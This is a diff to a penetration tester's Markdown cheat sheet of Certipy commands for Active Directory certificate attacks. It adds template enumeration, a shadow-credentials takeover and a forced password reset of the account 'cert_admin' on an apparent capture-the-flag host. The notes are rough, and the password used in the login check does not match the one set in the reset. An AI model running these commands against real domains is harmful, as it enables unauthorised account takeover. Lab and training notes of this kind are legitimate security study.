@@ -8,6 +8,12 @@
 certipy find -u <user>@<domain> -p '<password>' -dc-ip <dc-ip> 
 ```
 
+## certipy - list certificate templates pfr a specific user
+```
+certipy-ad find -target dc01.tombwatcher.htb -u john -p rogue
+```
+
+
 ## certipy - request certificate
 #plateform/linux #target/remote #cat/ATTACK
 ```
@@ -85,4 +91,16 @@ certipy account update -u <user>@<domain> -p '<password>' -user <targeted-user> 
 Full Chain exploit of Shadow Credential: Create a Key Credential, Authenticate to get NT hash and TGT, and remove the Key Credential
 ```
 certipy shadow auto -u <user>@<domain> -p '<password>' -account <targeted-user>
+```
+
+## certipy - shadow credentials debug
+```
+Shadow credentials (here somehow it doesn't work because of an unsupported auth PKINIT (error : https://github.com/ly4k/Certipy/issues/205))
+faketime "$(ntpdate -q dc01.tombwatcher.htb | cut -d ' ' -f 1,2)" \
+certipy shadow auto -u "john@tombwatcher.htb" -p "pouetpouet%A1" -account "cert_admin" -target $TARGET > doesn't work > need PKINIT
+
+// Instead, we reset the password from inside the windows shell of john
+Set-ADAccountPassword cert_admin -NewPassword (ConvertTo-SecureString 'pouetpouet%A1' -AsPlainText -Force)
+
+then check if OK : netexec smb dc01.tombwatcher.htb -u cert_admin -p '0xdf0xdf!'
 ```
